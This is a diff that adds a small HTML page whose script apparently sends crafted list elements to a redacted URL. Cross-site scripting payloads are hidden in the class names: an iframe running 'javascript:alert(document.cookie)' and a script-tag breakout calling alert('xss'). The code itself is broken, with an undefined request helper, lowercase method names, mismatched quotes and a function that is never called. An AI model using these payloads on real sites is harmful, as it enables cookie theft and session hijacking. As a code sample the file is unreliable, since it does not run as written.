@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+        <script type="text/javascript">
+                var x=createXMLHTTPObject();
+                var url="https://xxxxx/xxxxx/xxxxx/xxxx/xxxx"
+                function request(url){
+                x.open("POST",url,false);
+        let newItem=document.createElement('li');
+                newItem.classlist.add('><iframe src='javascript:alert(document.cookie)'></iframe>');
+                let newsubmenu=document.createElement('ul');
+        newsubmenu.classlist.add('</script><script>alert('xss');</script>');
+        newItem.appendchild(newsubmenu);
+    x.send(newItem);
+}
+        </script>
+
+</body>
+</html>
